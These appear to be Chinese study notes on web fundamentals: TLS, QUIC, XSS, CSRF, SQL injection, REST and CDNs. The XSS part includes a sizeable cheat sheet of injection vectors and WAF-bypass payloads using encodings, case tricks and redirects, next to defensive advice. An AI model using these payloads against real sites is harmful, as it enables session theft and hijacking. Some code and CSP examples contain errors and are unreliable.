**SSL**(Secure Sockets Layer) 安全套接层，是一种安全协议，经历了 SSL 1.0、2.0、3.0 版本后发展成了标准安全协议 - **TLS**(Transport Layer Security) 传输层安全性协议。

![image](https://user-gold-cdn.xitu.io/2018/8/31/1658dd61a9aca229?imageslim)

##### 记录层

记录层负责将原始数据经过分段、压缩、添加标识、加密后转化为TLS记录的数据

![image](https://user-gold-cdn.xitu.io/2018/8/31/1658dd61a9c3b26b?imageView2/0/w/1280/h/960/format/webp/ignore-error/1)

##### 握手层

![image](https://img-blog.csdn.net/20180615212223156?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3prMzMyNjMxMg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

1. 客户端向服务端发送一个建立连接的请求，其中包括客户端支持的ssl的版本，支持的加密方法，支持的压缩方法，确认的会话id，一个用于生成主密钥的32位随机数

2. 服务端收到后返回一个serverHello，其中包括服务端选择的ssl版本，选择的加密方法，选择的压缩方式，确认的会话的id，一个用于生成主密钥的32位随机数

3. 客户端向服务端发一个结束握手的请求，表示之后的报文都以约定好的密钥进行加密/解密


**为什么握手次数减少了一次**

这主要是因为之前ssl连接使用的RSA算法（关于这个算法可以参考我的上一篇文章[从零开始的计算机网络基础](https://juejin.im/post/5ea3c7036fb9a03c8122da2b)）,而TLS 1.3使用的是[ECDH算法](https://blog.csdn.net/mrpre/article/details/72850644)

#### 与HTTP的区别

1. http是超文本传输协议，信息是明文传输，https则是具有安全性的ssl加密传输协议。  
2. http的连接很简单，是无状态的；HTTPS协议是由SSL+HTTP协议构建的可进行加密传输、身份认证的网络协议，比http协议安全。  
3. https协议需要ca证书，费用较高。  
4. 使用不同的链接方式，端口也不同，一般而言，http协议的端口为80，https的端口为443

### HTTP3.0（QUIC）

1. **减少了TCP和TLS握手时间**：QUIC是基于UDP协议，因为UDP协议本身是无连接的，连接时只需一次交互，半个握手的时间
2. **保留HTTP2.0多路复用的特性**，但QUIC中一个连接上的多个stream之间没有依赖，因此丢包时避免了队头阻塞的问题
3. **优化重传**，TCP的重传时，封包的序列号不变，而QUIC则会改用一个新的序列号。这样做的好处是收到ACK时能找到其唯一对应的封包
4. **流量控制**：通过流量控制可以限制客户端传输数据的大小，接收端可以只保留相应大小的接收buffer。因为QUIC是基于UDP，UDP本身不具备流量控制功能
5. **连接迁移**：TCP连接基于四元组（源IP，源端口，目的IP，目的端口），有一个发生改变则需要重新建立连接。而QUIC使用一个64随机数Connection ID作为连接标识，即使IP或端口发生变化，Connection ID没有变化，那么连接可以维持

## Web安全

### XSS攻击

![xss](img/xss.png)

XSS ( Cross Site Scripting ) 是指恶意攻击者利用网站没有对用户提交数据进行转义处理或者过滤不足的缺点，进而添加一些代码，嵌入到 web 页面中去。使别的用户访问都会执行相应的嵌入代码。

从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。

#### XSS 攻击的危害包括：

1. 获取页面数据
2. 获取 cookie
3. 劫持前端逻辑
4. 发送请求
5. 偷取网站任意数据
6. 偷取用户资料
7. 偷取用户密码和登陆态
8. 欺骗用户

#### XSS 攻击分类

##### 反射型

通过 url 参数直接注入。

发出请求时，XSS 代码出现在 URL 中，作为输入提交到服务器端，服务端解析后返回，XSS 代码随响应内容一起传回给浏览器，最后浏览器执行 XSS 代码。这个过程像一次反射，故叫做反射型 XSS。

**举个例子**

一个链接，里面的 query 字段中包含一个 script 标签，这个标签的 src 就是恶意代码，用户点击了这个链接后会先向服务器发送请求，服务器返回时也携带了这个 XSS 代码，然后浏览器将查询的结果写入 Html，这时恶意代码就被执行了。

并不是在 url 中没有包含 script 标签的网址都是安全的，可以使用[短网址](dwz.com)来让网址变得很短。

##### 存储型

存储型 XSS 会被保存到数据库，在其他用户访问（前端）到这条数据时，这个代码会在访问用户的浏览器端执行。

**举个例子**

比如攻击者在一篇文章的评论中写入了 script 标签，这个评论被保存数据库，当其他用户看到这篇文章时就会执行这个脚本。

#### XSS 攻击注入点

- HTML 节点内容
  - 如果一个节点内容是动态生成的，而这个内容中包含用户输入。
- HTML 属性
  - 某些节点属性值是由用户输入的内容生成的。那么可能会被封闭标签后添加 script 标签。

```html
<img src="${image}" /> <img src="1" onerror="alert(1)" />
```

- Javascript 代码
  - JS 中包含由后台注入的变量或用户输入的信息。

```js
var data = "#{data}";
var data = "hello";
alert(1);
("");
```

- 富文本

#### XSS 防御

对于 XSS 攻击来说，通常有两种方式可以用来防御。

- 转义字符
- CSP 内容安全策略

##### 转义字符

- 普通的输入 - 编码

  - 对用户输入数据进行 HTML Entity 编码（使用转义字符）
  - "
  - &
  - <
  - \>
  - 空格

- 富文本 - 过滤（黑名单、白名单）

  - 移除上传的 DOM 属性，如 onerror 等
  - 移除用户上传的 style 节点、script 节点、iframe 节点等

- 较正
  - 避免直接对 HTML Entity 解码
  - 使用 DOM Parse 转换，校正不配对的 DOM 标签和属性

**对于会在 DOM 中出现的字符串（用户数据）：**

< 转义为 \&lt;

> 转义为 \&gt;

**对于可能出现在 DOM 元素属性上的数据**

" 转义为 \&quot;
' 转义为 \&9039;
空格转义为 \&nbsp; 但这可能造成多个连续的空格，也可以不对空格转义，但是一定要为属性加双引号

& 这个字符如果要转义，那么一定要放在转移函数的第一个来做

**避免 JS 中的插入**

```js
var data = "#{data}";
var data = "hello";
alert(1);
("");
```

因为是用引号将变量包裹起来的，而且被攻击也因为引号被提前结束，所以要做的就是将引号转义

```
先 \\ -> \\\\
再 " -> \\"
```

**富文本**

按照黑名单过滤： script 等
但是 html 标签中能执行 html 代码的属性太多了，比如 onclick, onhover,onerror, <a href="jacascript:alert(1)">

```js
function xssFilter = function (html) {
  html = html.replace(/<\s*\/?script\s*>/g, '');
  html = html.repalce(/javascript:[^'"]/g, '');
  html = html.replace(/onerror\s*=\s*['"]?[^'"]*['"]?/g, '');
  //....
  return html;
}
```

按照白名单过滤： 只允许某些标签和属性存在

做法：将 HTML 解析成树状结构，对于这个 DOM 树，一个一个的去看是否存在合法的标签和属性，如果不是就去掉。

使用 cheerio 就可以快速的解析 DOM

```js
function xssFilter(html) {
  const cheerio = require("cheerio");
  const $ = cheerio.load(html);

  //白名单
  const whiteList = { img: ["src"] };

  $("*").each((index, elem) => {
    if (!whiteList[elem.name]) {
      $(elem).remove();
      return;
    }
    for (let attr in elem.attribs) {
      if (whiteList[elem.name].indexOf(attr) === -1) {
        $(elem).attr(attr, null);
      }
    }
  });
  return html;
}
```

**使用 npm 包来简化操作**

[xss 文档](https://github.com/leizongmin/js-xss/blob/master/README.zh.md)

##### CSP 内容安全策略

CSP 本质上就是建立白名单，开发者明确告诉浏览器哪些外部资源可以加载和执行。我们只需要配置规则，如何拦截是由浏览器自己实现的。我们可以通过这种方式来尽量减少 XSS 攻击。

通常可以通过两种方式来开启 CSP：

- 设置 HTTP Header 中的 Content-Security-Policy
- 设置 meta 标签的方式 `<meta http-equiv="Content-Security-Policy">`

以设置 HTTP Header 来举例

- 只允许加载本站资源

```
Content-Security-Policy: default-src ‘self’
```

- 图片只允许加载 HTTPS 协议

```
Content-Security-Policy: img-src https://*
```

- 允许加载任何来源框架

```
Content-Security-Policy: child-src 'none'
```

[CSP](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP) ( Content Security Policy )

#### XSS 注入方法

参考链接：https://xz.aliyun.com/t/4067

##### `<scirpt>`

    <scirpt>alert("xss");</script>

##### `<img>`

    <img src=1 onerror=alert("xss");>

##### `<input>`

    <input onfocus="alert('xss');">
    
    竞争焦点，从而触发onblur事件
    <input onblur=alert("xss") autofocus><input autofocus>
    
    通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发
    <input onfocus="alert('xss');" autofocus>

##### `<details>`

    <details ontoggle="alert('xss');">
    
    使用open属性触发ontoggle事件，无需用户去触发
    <details open ontoggle="alert('xss');">

##### `<svg>`

    <svg onload=alert("xss");>

##### `<select>`

    <select onfocus=alert(1)></select>
    
    通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发
    <select onfocus=alert(1) autofocus>

##### `<iframe>`

    <iframe onload=alert("xss");></iframe>

##### `<video>`

    <video><source onerror="alert(1)">

##### `<audio>`

    <audio src=x  onerror=alert("xss");>

##### `<body>`

    <body/onload=alert("xss");>

利用换行符以及 autofocus，自动去触发 onscroll 事件，无需用户去触发

    <body
    onscroll=alert("xss");><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>

##### `<textarea>`

    <textarea onfocus=alert("xss"); autofocus>

##### `<keygen>`

    <keygen autofocus onfocus=alert(1)> //仅限火狐

##### `<marquee>`

    <marquee onstart=alert("xss")></marquee> //Chrome不行，火狐和IE都可以

##### `<isindex>`

    <isindex type=image src=1 onerror=alert("xss")>//仅限于IE

##### 利用 link 远程包含 js 文件

**PS：在无 CSP 的情况下才可以**

    <link rel=import href="http://127.0.0.1/1.js">

##### javascript 伪协议

`<a>`标签

    <a href="javascript:alert(`xss`);">xss</a>

`<iframe>`标签

    <iframe src=javascript:alert('xss');></iframe>

`<img>`标签

    <img src=javascript:alert('xss')>//IE7以下

`<form>`标签

    <form action="Javascript:alert(1)"><input type=submit>

##### 其它

expression 属性

    <img style="xss:expression(alert('xss''))"> // IE7以下
    <div style="color:rgb(''�x:expression(alert(1))"></div> //IE7以下
    <style>#test{x:expression(alert(/XSS/))}</style> // IE7以下

background 属性

    <table background=javascript:alert(1)></table> //在Opera 10.5和IE6上有效

#### 有过滤的情况下

##### 过滤空格

用`/`代替空格

<img/src\="x"/onerror\=alert("xss");\>

#### 过滤关键字

##### 大小写绕过

<ImG sRc\=x onerRor\=alert("xss");\>

##### 双写关键字

有些 waf 可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过

<imimgg srsrcc\=x onerror\=alert("xss");\>

##### 字符拼接

利用 eval

<img src\="x" onerror\="a=\`aler\`;b=\`t\`;c='(\`xss\`);';eval(a+b+c)"\>

利用 top

    <script>top["al"+"ert"](`xss`);</script>

##### 其它字符混淆

有的 waf 可能是用正则表达式去检测是否有 xss 攻击，如果我们能 fuzz 出正则的规则，则我们就可以使用其它字符去混淆我们注入的代码了  
下面举几个简单的例子

    可利用注释、标签的优先级等
    1.<<script>alert("xss");//<</script>
    2.<title><img src=</title>><img src=x onerror="alert(`xss`);"> //因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效
    3.<SCRIPT>var a="\\";alert("xss");//";</SCRIPT>

##### 编码绕过

Unicode 编码绕过

<img src\="x" onerror\="&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#120;&#115;&#115;&#34;&#41;&#59;"\>

<img src\="x" onerror\="eval('\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0022\\u0078\\u0073\\u0073\\u0022\\u0029\\u003b')"\>

url 编码绕过

<img src\="x" onerror\="eval(unescape('%61%6c%65%72%74%28%22%78%73%73%22%29%3b'))"\>

    <iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>

Ascii 码绕过

<img src\="x" onerror\="eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))"\>

hex 绕过

    <img src=x onerror=eval('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')>

八进制

    <img src=x onerror=alert('\170\163\163')>

base64 绕过

    <img src="x" onerror="eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw=='))">
    
    <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">

#### 过滤双引号，单引号

1.如果是 html 标签中，我们可以不用引号。如果是在 js 中，我们可以用反引号代替单双引号

    <img src="x" onerror=alert(`xss`);>

2.使用编码绕过，具体看上面我列举的例子，我就不多赘述了

#### 过滤括号

当括号被过滤的时候可以使用 throw 来绕过

    <svg/onload="window.onerror=eval;throw'=alert\x281\x29';">

#### 过滤 url 地址

##### 使用 url 编码

    <img src="x" onerror=document.location=`http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/`>

##### 使用 IP

1.十进制 IP

    <img src="x" onerror=document.location=`http://2130706433/`>

2.八进制 IP

    <img src="x" onerror=document.location=`http://0177.0.0.01/`>

3.hex

    <img src="x" onerror=document.location=`http://0x7f.0x0.0x0.0x1/`>

4.html 标签中用`//`可以代替`http://`

    <img src="x" onerror=document.location=`//www.baidu.com`>

5.使用`\\`

    但是要注意在windows下\本身就有特殊用途，是一个path 的写法，所以\\在Windows下是file协议，在linux下才会是当前域的协议

Windows 下  
![](https://xzfile.aliyuncs.com/media/upload/picture/20190208102122-3a40fff4-2b48-1.gif)  
Linux 下  
![](https://xzfile.aliyuncs.com/media/upload/picture/20190208103630-5775e02e-2b4a-1.gif)  
6.使用中文逗号代替英文逗号  
如果你在你在域名中输入中文句号浏览器会自动转化成英文的逗号

    <img src="x" onerror="document.location=`http://www。baidu。com`">//会自动跳转到百度

- 攻击方式

  跨站脚本攻击是指恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。   

- 解决方案

  为cookie设置httpOnly属性，对用户的输入进行检查，进行特殊字符过滤

### CSRF 跨站请求伪造

（Cross Site Request Forgy）
打开同一浏览器时其他的网站对本网站造成的影响。原理就是攻击者构造出一个后端请求地址，诱导用户点击或者通过某些途径自动发起请求。如果用户是在登录状态下的话，后端就以为是用户在操作，从而进行相应的逻辑。
![原理](../img/csrf.png)

举个例子，用户同时打开了 A 网站和钓鱼网站。 假设 A 网站中有一个通过 GET 请求提交用户评论的接口，那么攻击者就可以在钓鱼网站中加入一个图片，图片的地址就是评论接口。

```html
<img src="http://www.domain.com/xxx?comment='attack'" />
```

#### CSRF 攻击原理

1. 用户登录 A 网站
2. A 网站确认身份（给客户端 cookie）
3. B 网站页面向 A 网站发起请求（带上 A 网站身份）

#### CSRF 防御

1. Get 请求不对数据进行修改
2. 不让第三方网站访问到用户 Cookie
3. 阻止第三方网站请求接口
4. 请求时附带验证信息，比如验证码或者 Token

- SameSite
  - 可以对 Cookie 设置 SameSite 属性。该属性表示 Cookie 不随着跨域请求发送，可以很大程度减少 CSRF 的攻击，但是该属性目前并不是所有浏览器都兼容。
- Token 验证
  - cookie 是发送时自动带上的，而不会主动带上 Token，所以在每次发送时主动发送 Token
- Referer 验证
  - 对于需要防范 CSRF 的请求，我们可以通过验证 Referer 来判断该请求是否为第三方网站发起的。
- 隐藏令牌
  - 主动在 HTTP 头部中添加令牌信息

禁止第三方网站带 cookies

[same-site](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies#SameSite_Cookies)属性。 设置只有同一站点的请求才能携带 cookie

#### CSRF 蠕虫

如果某个用户打开了被攻击网页，并且用户同时访问了攻击者的网页。
那么攻击者的网页就会使用用户的身份发送一些请求，并且常用用户的身份发布一些评论或文章，里面包含攻击者的网页链接。如果其他用户看到了这个用户的这条评论，都甚至可以不点击，其他用户也会被盗用身份发送一些恶意请求。这样病毒的传播就会越来越快，影响越来越大。

#### CSRF 攻击危害

- 利用用户登录态
- 用户不知情
- 完成业务请求
- 盗取用户资金
- 冒充用户发帖背锅
- 损坏网站名誉

### 中间人攻击

- 攻击方式

  也称浏览器劫持，web劫持。简单来说就是黑客通过各种各样的技术手段，在服务端发送出的HTTP报文与显示屏呈现的WEB页面之间做了一些手脚，纂改网页的部分或全部内容。主要分为网络挟持纂改和终端挟持纂改（比如盗版游戏中植入的一些木马经常会纂改你的浏览器主页）。
  [更多信息](https://www.zhuyingda.com/blog/article.html?id=7&origin=gold)

- 解决方案

  使用HTTPS协议传输报文，远离不安全的网站。

### SQL 注入

- 攻击方式
所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，后台执行SQL语句时直接把前端传入的字段拿来做SQL查询。

- 解决方案

  - 永远不要信任用户的输入。
  - 永远不要使用动态拼装sql
  - 不要把机密信息直接存放

## RESTful

REST (Representational State Transfer)，中文意思是：表述性状态转移。 一组架构约束条件和原则，如果一个架构符合 REST 的约束条件和原则，我们就称它为 RESTful 架构。

RESTful 基本概念

- 在 REST 中，一切的内容都被认为是一种资源
- 每个资源都由 URI 唯一标识
- 使用统一的接口处理资源请求（POST/GET/PUT/DELETE/HEAD）
- 无状态（每次请求之前是无关联，没有 session ）

### 理解 RESTful

下面我们结合 REST 原则，围绕资源展开讨论，从资源的定义、获取、表述、关联、状态变迁等角度，列举一些关键概念并加以解释。

- 资源与 URI
- 统一资源接口
- 资源的表述
- 资源的链接
- 状态的转移

### 资源和 URI

- 使用 `/` 来表示资源的层级关系
- 使用 `?` 用来过滤资源
- 使用 `_` 或者 `-` 让 URI 的可读性更好
- `,` 或 `;` 可以用来表示同级资源的关系

### 统一资源接口

| 请求方法 | 描述                                                         |
| -------- | ------------------------------------------------------------ |
| GET      | 获取某个资源。 幂等（取多少次结果都没有变化）                |
| POST     | 创建一个新的资源                                             |
| PUT      | 替换某个已有的资源（更新操作） ， 幂等（更新多次只保存一个结果） |
| DELETE   | 删除某个资源                                                 |
| HEAD     | 主要用于确认 URL 的有效性以及资源更新的日期时间等            |
| PATCH    | 新引入的，对 PUT 方法的补充，用来对已知资源进行局部更新      |

### 资源表述

客户端获取的只是资源的表述而已。资源在外界的具体呈现，可以有多种表述(或成为表现、表示)形式，在客户端和服务端之间传送的也是资源的表述，而不是资源本身。文本资源可以采用 html、xml、json 等格式，图片可以使用 PNG 或 JPG 展现出来。

资源的表述包括数据和描述数据的元数据，例如，HTTP 头 “Content-Type” 就是这样一个元数据属性。

那么客户端如何知道服务端提供哪种表述形式呢？

答案是可以通过 HTTP 内容协商，客户端可以通过 Accept 头请求一种特定格式的表述，服务端则通过 Content-Type 告诉客户端资源的表述形式。

MIME 类型

accept: text/xml html 文件

Content-Type 告诉客户端资源的表述形式

### 资源的链接

超媒体即应用状态引擎（可以做多层链接）

https://api.github.com/repos/github

```
{
  "message": "Not Found",
  "documentation_url": "https://developer.github.com/v3"
}
```

### 状态转移

服务器端不应该保存客户端状态。

应用状态 -> 服务器端不保存应用状态

访问订单 根据接口去查询

访问商品 查询

## CDN

CDN（Content Delivery Network，内容分发网络）是构建在现有互联网基础之上的一层智能虚拟网络，通过在网络各处部署节点服务器，实现将源站内容分发至所有 CDN 节点，使用户可以就近获得所需的内容。CDN 服务缩短了用户查看内容的访问延迟，提高了用户访问网站的响应速度与网站的可用性，解决了网络带宽小、用户访问量大、网点分布不均等问题。

### 加速原理

当用户访问使用 CDN 服务的网站时，本地 DNS 服务器通过 CNAME 方式将最终域名请求重定向到 CDN 服务。CDN 通过一组预先定义好的策略(如内容类型、地理区域、网络负载状况等)，将当时能够最快响应用户的 CDN 节点 IP 地址提供给用户，使用户可以以最快的速度获得网站内容。使用 CDN 后的 HTTP 请求处理流程如下：

### CDN 节点有缓存场景

![cdncache](/Users/wangyang119/Document/webKnowledge/img/cdncache.png)

1. 用户在浏览器输入要访问的网站域名，向本地 DNS 发起域名解析请求。
2. 域名解析的请求被发往网站授权 DNS 服务器。
3. 网站 DNS 服务器解析发现域名已经 CNAME 到了 www.example.com.c.cdnhwc1.com。
4. 请求被指向 CDN 服务。
5. CDN 对域名进行智能解析，将响应速度最快的 CDN 节点 IP 地址返回给本地 DNS。
6. 用户获取响应速度最快的 CDN 节点 IP 地址。
7. 浏览器在得到速度最快节点的 IP 地址以后，向 CDN 节点发出访问请求。
8. CDN 节点将用户所需资源返回给用户。

### CDN 节点无缓存场景

![无缓存](/Users/wangyang119/Document/webKnowledge/img/cdnnocahche.png)

1. 用户在浏览器输入要访问的网站域名，向本地 DNS 发起域名解析请求。
2. 域名解析的请求被发往网站授权 DNS 服务器。
3. 网站 DNS 服务器解析发现域名已经 CNAME 到了 www.example.com.c.cdnhwc1.com。
4. 请求被指向 CDN 服务。
5. CDN 对域名进行智能解析，将响应速度最快的 CDN 节点 IP 地址返回给本地 DNS。
6. 用户获取响应速度最快的 CDN 节点 IP 地址。
7. 浏览器在得到速度最快节点的 IP 地址以后，向 CDN 节点发出访问请求。
8. CDN 节点回源站拉取用户所需资源。
9. 将回源拉取的资源缓存至节点。
10. 将用户所需资源返回给用户。

PS：CNAME 别名解析是将域名指向一个网址（域名）

## 从零开始实现一个简易的HTTP服务器

技术栈：

## 参考文献

图解HTTP 

[WebSocket 是什么原理？为什么可以实现持久连接？](https://www.zhihu.com/question/20215561)

[虚拟机是怎么实现的](https://www.zhihu.com/question/20848931)

[[*http*1.0、*http1.1*和*http*2.0的区别](https://zhuanlan.zhihu.com/p/111946824)](https://www.zhihu.com/search?type=content&q=http1.1)

[HTTP发展史（HTTP1.1，HTTPS，SPDY，HTTP2.0，QUIC，HTTP3.0）](https://juejin.im/post/5dc37277f265da4d57771f87)

[TLS 详解](https://juejin.im/post/5b88a93df265da43231f1451)

[详解TLS1.3的握手过程](https://blog.csdn.net/zk3326312/article/details/80245756)